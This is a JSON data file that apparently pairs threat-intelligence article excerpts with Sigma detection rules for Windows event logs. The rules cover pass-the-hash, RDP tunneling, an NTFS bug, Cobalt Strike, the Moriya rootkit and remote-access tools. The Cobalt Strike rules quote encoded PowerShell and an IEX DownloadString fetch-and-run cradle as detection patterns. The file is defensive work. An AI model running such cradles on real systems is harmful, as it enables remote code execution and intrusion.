    "markdown": "# Chronicles of a Threat Hunter: Hunting for In-Memory Mimikatz with Sysmon, Win Event Logs, and ELK - Part III (Overpass-the-Hash - EIDs 10, 4624, 4648, 4768) In my last posts about hunting for In-memory mimikatz that you can read here and here, I showed you that even though Mimikatz is executed without touching disk, it was still loading the same modules/Images and accessing Lsass.exe with the same permissions as if it would have done so. My goal with this research has been primarily to develop a strong fingerprint to detect In-memory mimikatz without focusing on the name of the",
    "sigma_rule": {
      "title": "Successful Overpass the Hash Attempt",
      "id": "192a0330-c20b-4356-90b6-7b7049ae0b87",
      "status": "test",
      "description": "Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.",
      "references": [
        "https://web.archive.org/web/20220419045003/https://cyberwardog.blogspot.com/2017/04/chronicles-of-threat-hunter-hunting-for.html"
      ],
      "author": "Roberto Rodriguez (source), Dominik Schaudel (rule)",
      "date": "2018-02-12",
      "modified": "2021-11-27",
      "tags": [
        "attack.lateral-movement",
        "attack.s0002",
        "attack.t1550.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4624,
          "LogonType": 9,
          "LogonProcessName": "seclogo",
          "AuthenticationPackageName": "Negotiate"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Runas command-line tool using /netonly parameter"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_overpass_the_hash.yml"
  },
  "810": {
    "url": "https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events",
    "markdown": "# Windows Event Monitoring Guidance ## Recommended Events to Collect ### Account Usage User account information can be collected and audited. Tracking local account usage can help detect Pass the Hash activity and other unauthorized account usage. Additional information such as remote desktop logins, users added to privileged groups, and account lockouts can also be tracked. User accounts being promoted to privileged groups should be audited very closely to ensure that users are in fact supposed to be in a privileged group. Unauthorized membership in privileged groups is a strong indicator that malicious activity has occurred. Lockout events for domain",
    "sigma_rule": {
      "title": "Pass the Hash Activity 2",
      "id": "8eef149c-bd26-49f2-9e5a-9b00e3af499b",
      "status": "stable",
      "description": "Detects the attack technique pass the hash which is used to move laterally inside the network",
      "references": [
        "https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events",
        "https://web.archive.org/web/20170909091934/https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis",
        "https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/"
      ],
      "author": "Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)",
      "date": "2019-06-14",
      "modified": "2022-10-05",
      "tags": [
        "attack.lateral-movement",
        "attack.t1550.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The successful use of PtH for lateral movement between workstations would trigger event ID 4624"
      },
      "detection": {
        "selection_logon3": {
          "EventID": 4624,
          "SubjectUserSid": "S-1-0-0",
          "LogonType": 3,
          "LogonProcessName": "NtLmSsp",
          "KeyLength": 0
        },
        "selection_logon9": {
          "EventID": 4624,
          "LogonType": 9,
          "LogonProcessName": "seclogo"
        },
        "filter": {
          "TargetUserName": "ANONYMOUS LOGON"
        },
        "condition": "1 of selection_* and not filter"
      },
      "falsepositives": [
        "Administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_pass_the_hash_2.yml"
  },
  "811": {
    "url": "https://web.archive.org/web/20170909091934/https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis",
    "markdown": "",
    "sigma_rule": {
      "title": "Pass the Hash Activity 2",
      "id": "8eef149c-bd26-49f2-9e5a-9b00e3af499b",
      "status": "stable",
      "description": "Detects the attack technique pass the hash which is used to move laterally inside the network",
      "references": [
        "https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events",
        "https://web.archive.org/web/20170909091934/https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis",
        "https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/"
      ],
      "author": "Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)",
      "date": "2019-06-14",
      "modified": "2022-10-05",
      "tags": [
        "attack.lateral-movement",
        "attack.t1550.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The successful use of PtH for lateral movement between workstations would trigger event ID 4624"
      },
      "detection": {
        "selection_logon3": {
          "EventID": 4624,
          "SubjectUserSid": "S-1-0-0",
          "LogonType": 3,
          "LogonProcessName": "NtLmSsp",
          "KeyLength": 0
        },
        "selection_logon9": {
          "EventID": 4624,
          "LogonType": 9,
          "LogonProcessName": "seclogo"
        },
        "filter": {
          "TargetUserName": "ANONYMOUS LOGON"
        },
        "condition": "1 of selection_* and not filter"
      },
      "falsepositives": [
        "Administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_pass_the_hash_2.yml"
  },
  "812": {
    "url": "https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/",
    "markdown": "# How to Detect Pass-the-Hash Attacks **Published:** November 30, 2021 **Updated:** March 17, 2023 --- Attackers frequently rely on lateral movement techniques to infiltrate corporate networks and obtain privileged access to credentials and data. In particular, one common technique is pass-the-hash: Hackers use stolen password hashes to authenticate as a user without ever having the user’s cleartext password. This tactic enables them to bypass normal system access controls to move laterally within the environment. This post explains exactly what to look for in the native Windows event logs to detect pass the hash, and offers additional options for spotting —",
    "sigma_rule": {
      "title": "Pass the Hash Activity 2",
      "id": "8eef149c-bd26-49f2-9e5a-9b00e3af499b",
      "status": "stable",
      "description": "Detects the attack technique pass the hash which is used to move laterally inside the network",
      "references": [
        "https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events",
        "https://web.archive.org/web/20170909091934/https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis",
        "https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/"
      ],
      "author": "Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)",
      "date": "2019-06-14",
      "modified": "2022-10-05",
      "tags": [
        "attack.lateral-movement",
        "attack.t1550.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The successful use of PtH for lateral movement between workstations would trigger event ID 4624"
      },
      "detection": {
        "selection_logon3": {
          "EventID": 4624,
          "SubjectUserSid": "S-1-0-0",
          "LogonType": 3,
          "LogonProcessName": "NtLmSsp",
          "KeyLength": 0
        },
        "selection_logon9": {
          "EventID": 4624,
          "LogonType": 9,
          "LogonProcessName": "seclogo"
        },
        "filter": {
          "TargetUserName": "ANONYMOUS LOGON"
        },
        "condition": "1 of selection_* and not filter"
      },
      "falsepositives": [
        "Administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_pass_the_hash_2.yml"
  },
  "813": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling **January 24, 2019** --- Remote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to",
    "sigma_rule": {
      "title": "RDP Login from Localhost",
      "id": "51e33403-2a37-4d66-a574-1fda1782cc31",
      "status": "test",
      "description": "RDP login with localhost source address may be a tunnelled login",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/"
      ],
      "author": "Thomas Patzke",
      "date": "2019-01-28",
      "modified": "2022-10-09",
      "tags": [
        "attack.lateral-movement",
        "car.2013-07-002",
        "attack.t1021.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4624,
          "LogonType": 10,
          "IpAddress": [
            "::1",
            "127.0.0.1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_rdp_localhost_login.yml"
  },
  "814": {
    "url": "https://twitter.com/jonasLyk/status/1347900440000811010",
    "markdown": "# Post Jan 9, 2021 NTFS VULNERABILITY CRITICALITY UNDERESTIMATED - There is a specially nasty vulnerability in NTFS right now. Triggerable by opening a specially crafted name in any folder anywhere. The vulnerability will instantly pop up complaining about your hard drive being corrupted when the path is opened. ```image Description: The image displays a screenshot of a Windows Event Viewer log focused on NTFS errors and warnings. It shows a timeline of events, highlighting various warnings and an error related to NTFS. The detailed view at the bottom provides specific information about a critical NTFS event (Event ID 55),",
    "sigma_rule": {
      "title": "NTFS Vulnerability Exploitation",
      "id": "f14719ce-d3ab-4e25-9ce6-2899092260b0",
      "status": "test",
      "description": "This the exploitation of a NTFS vulnerability as reported without many details via Twitter",
      "references": [
        "https://twitter.com/jonasLyk/status/1347900440000811010",
        "https://web.archive.org/web/20210413200553/https://twitter.com/wdormann/status/1347958161609809921",
        "https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-01-11",
      "modified": "2022-12-25",
      "tags": [
        "attack.impact",
        "attack.t1499.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection": {
          "Provider_Name": "Ntfs",
          "EventID": 55,
          "Origin": "File System Driver",
          "Description|contains|all": [
            "contains a corrupted file record",
            "The name of the file is \"\\\""
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\ntfs\\win_system_ntfs_vuln_exploit.yml"
  },
  "815": {
    "url": "https://web.archive.org/web/20210413200553/https://twitter.com/wdormann/status/1347958161609809921",
    "markdown": "########### Post Jan 9, 2021 Nice find by @jonasLyk : cd <specialdir> Result: NTFS corruption Other vectors: - Open an ISO, VHD, or VHDX - Extract a ZIP file - Open an HTML file without a MoTW - Probably more... ```image Description: The image displays a pop-up window from the 'Security and Maintenance' feature in Windows. It has a red circle with a white 'X' icon, indicating an error. The message reads: \"Restart to repair drive errors\" with a prompt to click and restart the PC. This visual is relevant to the context, which discusses NTFS corruption and potential vulnerabilities",
    "sigma_rule": {
      "title": "NTFS Vulnerability Exploitation",
      "id": "f14719ce-d3ab-4e25-9ce6-2899092260b0",
      "status": "test",
      "description": "This the exploitation of a NTFS vulnerability as reported without many details via Twitter",
      "references": [
        "https://twitter.com/jonasLyk/status/1347900440000811010",
        "https://web.archive.org/web/20210413200553/https://twitter.com/wdormann/status/1347958161609809921",
        "https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-01-11",
      "modified": "2022-12-25",
      "tags": [
        "attack.impact",
        "attack.t1499.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection": {
          "Provider_Name": "Ntfs",
          "EventID": 55,
          "Origin": "File System Driver",
          "Description|contains|all": [
            "contains a corrupted file record",
            "The name of the file is \"\\\""
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\ntfs\\win_system_ntfs_vuln_exploit.yml"
  },
  "816": {
    "url": "https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/",
    "markdown": "# Windows 10 bug corrupts your hard drive on seeing this file's icon January 14, 2021 An unpatched zero-day in Microsoft Windows 10 allows attackers to corrupt an NTFS-formatted hard drive with a one-line command. In multiple tests by _BleepingComputer_, this one-liner can be delivered hidden inside a Windows shortcut file, a ZIP archive, batch files, or various other vectors to trigger hard drive errors that corrupt the filesystem index instantly. ## \"Critically underestimated\" NTFS vulnerability In August 2020, October 2020, and finally this week, infosec researcher Jonas L drew attention to an NTFS vulnerability impacting Windows 10 that has",
    "sigma_rule": {
      "title": "NTFS Vulnerability Exploitation",
      "id": "f14719ce-d3ab-4e25-9ce6-2899092260b0",
      "status": "test",
      "description": "This the exploitation of a NTFS vulnerability as reported without many details via Twitter",
      "references": [
        "https://twitter.com/jonasLyk/status/1347900440000811010",
        "https://web.archive.org/web/20210413200553/https://twitter.com/wdormann/status/1347958161609809921",
        "https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-01-11",
      "modified": "2022-12-25",
      "tags": [
        "attack.impact",
        "attack.t1499.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection": {
          "Provider_Name": "Ntfs",
          "EventID": 55,
          "Origin": "File System Driver",
          "Description|contains|all": [
            "contains a corrupted file record",
            "The name of the file is \"\\\""
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\ntfs\\win_system_ntfs_vuln_exploit.yml"
  },
  "817": {
    "url": "https://www.sans.org/webcasts/119395",
    "markdown": "# Tech Tuesday Workshop Cobalt Strike Detection via Log Analysis **11 May 2021** Cobalt Strike has become the attack tool of choice among enlightened global threat actors, making an appearance in almost every recent major hack. Cobalt Strike is an extremely capable and stealthy tool suite, but log analysis can level the playing field, providing many opportunities for detection. This workshop will leverage data sourced from SANS FOR508: Advanced Incident Response, Threat Hunting and Digital Forensics to provide insight into how Cobalt Strike operates and how to detect many of its characteristics via endpoint logs. Whether you are just starting",
    "sigma_rule": {
      "title": "CobaltStrike Service Installations - System",
      "id": "5a105d34-05fc-401e-8553-272b45c1522d",
      "status": "test",
      "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "references": [
        "https://www.sans.org/webcasts/119395",
        "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Wojciech Lesicki",
      "date": "2021-05-26",
      "modified": "2022-11-27",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.lateral-movement",
        "attack.t1021.002",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_id": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection1": {
          "ImagePath|contains|all": [
            "ADMIN$",
            ".exe"
          ]
        },
        "selection2": {
          "ImagePath|contains|all": [
            "%COMSPEC%",
            "start",
            "powershell"
          ]
        },
        "selection3": {
          "ImagePath|contains": "powershell -nop -w hidden -encodedcommand"
        },
        "selection4": {
          "ImagePath|base64offset|contains": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:"
        },
        "condition": "selection_id and (selection1 or selection2 or selection3 or selection4)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_cobaltstrike_service_installs.yml"
  },
  "818": {
    "url": "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
    "markdown": "",
    "sigma_rule": {
      "title": "CobaltStrike Service Installations - System",
      "id": "5a105d34-05fc-401e-8553-272b45c1522d",
      "status": "test",
      "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "references": [
        "https://www.sans.org/webcasts/119395",
        "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Wojciech Lesicki",
      "date": "2021-05-26",
      "modified": "2022-11-27",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.lateral-movement",
        "attack.t1021.002",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_id": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection1": {
          "ImagePath|contains|all": [
            "ADMIN$",
            ".exe"
          ]
        },
        "selection2": {
          "ImagePath|contains|all": [
            "%COMSPEC%",
            "start",
            "powershell"
          ]
        },
        "selection3": {
          "ImagePath|contains": "powershell -nop -w hidden -encodedcommand"
        },
        "selection4": {
          "ImagePath|base64offset|contains": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:"
        },
        "condition": "selection_id and (selection1 or selection2 or selection3 or selection4)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_cobaltstrike_service_installs.yml"
  },
  "819": {
    "url": "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/",
    "markdown": "# Cobalt Strike, a Defender’s Guide **Categories:** CobaltStrike, Tools **Published on:** August 29, 2021 --- ## Intro In our research, we expose adversarial Tactics, Techniques, and Procedures (TTPs) as well as the tools they use to execute their mission objectives. In most of our cases, we see the threat actors utilizing Cobalt Strike. Therefore, defenders should know how to detect Cobalt Strike in various stages of its execution. The primary purpose of this post is to expose the most common techniques that we see from the intrusions that we track and provide detections. Having said that, not all of Cobalt",
    "sigma_rule": {
      "title": "CobaltStrike Service Installations - System",
      "id": "5a105d34-05fc-401e-8553-272b45c1522d",
      "status": "test",
      "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "references": [
        "https://www.sans.org/webcasts/119395",
        "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Wojciech Lesicki",
      "date": "2021-05-26",
      "modified": "2022-11-27",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.lateral-movement",
        "attack.t1021.002",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_id": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection1": {
          "ImagePath|contains|all": [
            "ADMIN$",
            ".exe"
          ]
        },
        "selection2": {
          "ImagePath|contains|all": [
            "%COMSPEC%",
            "start",
            "powershell"
          ]
        },
        "selection3": {
          "ImagePath|contains": "powershell -nop -w hidden -encodedcommand"
        },
        "selection4": {
          "ImagePath|base64offset|contains": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:"
        },
        "condition": "selection_id and (selection1 or selection2 or selection3 or selection4)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_cobaltstrike_service_installs.yml"
  },
  "820": {
    "url": "https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831",
    "markdown": "# Operation TunnelSnake **APT reports** **06 May 2021** ## Formerly unknown rootkit used to secretly control networks of regional organizations Windows rootkits, especially those operating in kernel space, are pieces of malware infamous for their near absolute power in the operating system. Usually deployed as drivers, such implants have high privileges in the system, allowing them to intercept and potentially tamper with core I/O operations conducted by the underlying OS, like reading or writing to files or processing incoming and outgoing network packets. The capability to blend into the fabric of the operating system itself, much like security products do,",
    "sigma_rule": {
      "title": "Moriya Rootkit - System",
      "id": "25b9c01c-350d-4b95-bed1-836d04a4f324",
      "status": "test",
      "description": "Detects the use of Moriya rootkit as described in the securelist's Operation TunnelSnake report",
      "references": [
        "https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831"
      ],
      "author": "Bhabesh Raj",
      "date": "2021-05-06",
      "modified": "2022-11-29",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045,
          "ServiceName": "ZzNetSvc"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_moriya_rootkit.yml"
  },
  "821": {
    "url": "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
    "markdown": "# BumbleBee Roasts Its Way to Domain Admin **Categories:** AdFind, BumbleBee, Cobalt Strike, Kerberoast, ShareFinder **Published Date:** August 8, 2022 --- ## Introduction In this intrusion from April 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee is a malware loader first reported by Google Threat Analysis Group in March 2022. Google TAG attributes this malware to an initial access broker (IAB) dubbed EXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193. Read more about BumbleBee here and here. During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement",
    "sigma_rule": {
      "title": "Anydesk Remote Access Software Service Installation",
      "id": "530a6faa-ff3d-4022-b315-50828e77eef5",
      "status": "test",
      "description": "Detects the installation of the anydesk software service. Which could be an indication of anydesk abuse if you the software isn't already used.",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2022-08-11",
      "modified": "2025-02-24",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_provider": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service": [
          {
            "ServiceName|contains|all": [
              "AnyDesk",
              "Service"
            ]
          },
          {
            "ImagePath|contains": "AnyDesk"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage of the anydesk tool"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_anydesk.yml"
  },
  "822": {
    "url": "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
    "markdown": "# Confluence Exploit Leads to LockBit Ransomware **Categories:** exploit, lockbit, ransomware **Published on:** February 24, 2025 ## Key Takeaways - The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment. - The threat actor leveraged various tools, including Mimikatz, Metasploit, and AnyDesk. - The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy. - Sensitive data was exfiltrated using Rclone, transferring files to MEGA.io cloud storage.",
    "sigma_rule": {
      "title": "Anydesk Remote Access Software Service Installation",
      "id": "530a6faa-ff3d-4022-b315-50828e77eef5",
      "status": "test",
      "description": "Detects the installation of the anydesk software service. Which could be an indication of anydesk abuse if you the software isn't already used.",
      "references": [
        "https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2022-08-11",
      "modified": "2025-02-24",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_provider": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service": [
          {
            "ServiceName|contains|all": [
              "AnyDesk",
              "Service"
            ]
          },
          {
            "ImagePath|contains": "AnyDesk"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage of the anydesk tool"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_anydesk.yml"
  },
  "823": {
    "url": "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
    "markdown": "# Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware **Categories:** adfind cobaltstrike ransomware **Published on:** November 28, 2022 --- In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over an eight-day period. During this time, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike. Remote access tools were used for command and control, such as Tactical RMM and Anydesk. The threat actors' final actions included data exfiltration using Rclone and domain-wide deployment of Quantum Ransomware. We have observed similar traits in previous cases where Emotet and",
    "sigma_rule": {
      "title": "Mesh Agent Service Installation",
      "id": "e0d1ad53-c7eb-48ec-a87a-72393cc6cedc",
      "status": "test",
      "description": "Detects a Mesh Agent service installation. Mesh Agent is used to remotely manage computers",
      "references": [
        "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_root": {
          "Provider_Name": "Service Control Manager",
          "EventID": 7045
        },
        "selection_service": [
          {
            "ImagePath|contains": "MeshAgent.exe"
          },
          {
            "ServiceName|contains": "Mesh Agent"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of the tool"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_mesh_agent.yml"
  },
  "824": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Remote Access Tool Services Have Been Installed - System",
      "id": "1a31b18a-f00c-4061-9900-f735b96c99fc",
      "related": [
        {
          "id": "c8b00925-926c-47e3-beea-298fd563728e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects service installation of different remote access tools software. These software are often abused by threat actors to perform",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Connor Martin, Nasreddine Bencherchali",
      "date": "2022-12-23",
      "modified": "2023-06-22",
      "tags": [
        "attack.persistence",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection": {
          "Provider_Name": "Service Control Manager",
          "EventID": [
            7045,
            7036
          ],
          "ServiceName|contains": [
            "AmmyyAdmin",
            "Atera",
            "BASupportExpressSrvcUpdater",
            "BASupportExpressStandaloneService",
            "chromoting",
            "GoToAssist",
            "GoToMyPC",
            "jumpcloud",
            "LMIGuardianSvc",
            "LogMeIn",
            "monblanking",
            "Parsec",
            "RManService",
            "RPCPerformanceService",
            "RPCService",
            "SplashtopRemoteService",
            "SSUService",
            "TeamViewer",
            "TightVNC",
            "vncserver",
            "Zoho"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\system\\service_control_manager\\win_system_service_install_remote_access_software.yml"
  },
  "825": {
    "url": "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/client/command/commands.go#L1231",
    "markdown": "# Sliver Implant Framework **Copyright (C) 2019 Bishop Fox** This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License",
    "sigma_rule": {
      "title": "Sliver C2 Default Service Installation",
      "id": "31c51af6-e7aa-4da7-84d4-8f32cc580af2",
      "status": "test",
      "description": "Detects known malicious service installation that appear in cases in which a Sliver implants execute the PsExec commands",
      "references": [
        "https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/client/command/commands.go#L1231",
        "https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-25",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "system"
      },
      "detection": {
        "selection_eid": {
